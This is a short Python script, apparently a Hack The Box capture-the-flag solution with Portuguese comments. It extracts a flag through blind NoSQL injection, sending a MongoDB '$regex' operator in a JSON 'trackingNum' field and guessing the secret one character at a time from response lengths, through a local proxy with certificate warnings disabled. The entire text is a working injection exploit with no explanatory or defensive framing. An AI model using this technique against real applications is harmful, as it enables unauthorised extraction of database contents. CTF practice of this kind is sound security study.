import requests
import sys
requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/json'
}

url = f"{sys.argv[1]}/index.php"
name = 'HTB{'

while True: #Looping infinito
	printables = '0123456789abcdefghijklmnopqrstuvwxyz' #Coloca digitos e chars minusculos
	for char in printables:
		data = {
			'trackingNum': {"$regex":f"^{name}{char}.*"}
		}
		response = requests.post(url, json=data, headers=headers, proxies=proxies) #Utilizar 'json' para requisicoes json
		tam = len(response.content)
		if tam == 35 or tam == 0:
			continue
		else: 
			name += char
			print(name)
			a = len(name)
			if a == 36:
				print(name + "}")
				sys.exit()
			break